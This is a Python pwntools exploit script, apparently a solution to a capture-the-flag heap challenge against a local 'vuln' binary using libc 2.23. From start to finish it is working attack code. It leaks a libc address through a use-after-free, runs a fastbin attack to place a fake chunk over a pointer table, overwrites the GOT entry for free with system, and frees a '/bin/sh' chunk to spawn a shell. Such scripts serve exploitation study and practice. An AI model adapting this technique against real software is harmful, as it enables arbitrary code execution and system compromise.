#!/usr/bin/env python3 

from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc-2.23.so')

p = elf.process()
gdb.attach(p, '''
	b *malloc
	b *free
''')

ptrHeap = 0x605310      # :	Stores pointers for all of the Zealots allocated
countChunk = 0x605630   # :	Integer that stores the amount of Zealots allocated

# bug is write out of bounds => heap overflow
# bug is free not set ptr = 0 => UAF ad DF

def makeZealot(size, content):
    p.recvuntil(b">>")
    p.sendline(b'1')
    p.recvuntil(b">>")
    p.sendline(str(size))
    p.recvuntil(b">>")
    p.sendline(content)

def destroyZealot(index):
    p.recvuntil(b">>")
    p.sendline(b'2')
    p.recvuntil(b">>")
    p.sendline(str(index))

def fixZealot(index, content):
    p.recvuntil(b">>")
    p.sendline(b'3')
    p.recvuntil(b">>")
    p.sendline(str(index))
    p.recvuntil(b">>")
    p.sendline(str(len(content)))
    p.recvuntil(b">>")
    p.sendline(content)

def showZealot(index):
    p.recvuntil(b">>")
    p.sendline(b'4')
    p.recvuntil(b">>")
    p.sendline(str(index))

#leak 
makeZealot(0x100, b'0'*0x100) # chunk 0
makeZealot(0x80, b'1'*0x80) # chunk 1
makeZealot(0x100, b'2'*0x100) # chunk 2
makeZealot(0x40, b'3'*0x40) # chunk 3 

destroyZealot(2)

showZealot(2)
p.recvline() # SHOWING

leak = p.recvuntil(b"|").strip(b"|")
main_arena88 = u64(leak.ljust(8, b'\x00'))
libc_base = main_arena88 - libc.symbols['main_arena'] - 88
System = libc_base + libc.symbols['system']

log.info("Libc base:  " + hex(libc_base))
log.info("System:     " + hex(System))

fake_chunk = ptrHeap - 0x23 
log.info("Fake chunk: " + hex(fake_chunk))

#fastbins attack

makeZealot(0x60, b"4" * 0x60) # chunk 4
makeZealot(0x60, b"5" * 0x60) # chunk 5

destroyZealot(4)
destroyZealot(5)

fixZealot(5, p64(fake_chunk) + p64(0)*0x58)

makeZealot(0x60, b"6" * 0x60) # chunk 6

# fake chunk
makeZealot(0x60, b"0")

# Overwrite the first heap ptr[0] with the got table entry for free
fixZealot(7, b'0' * 0x13 + p64(elf.got['free']))

# Overwrite got entry for free with system
fixZealot(0, p64(System))


# Write the string `/bin/sh` to chunk 1
fixZealot(1,  b"/bin/sh\x00")

# Free chunk 1 to call system("/bin/sh")
destroyZealot(1)


p.interactive()



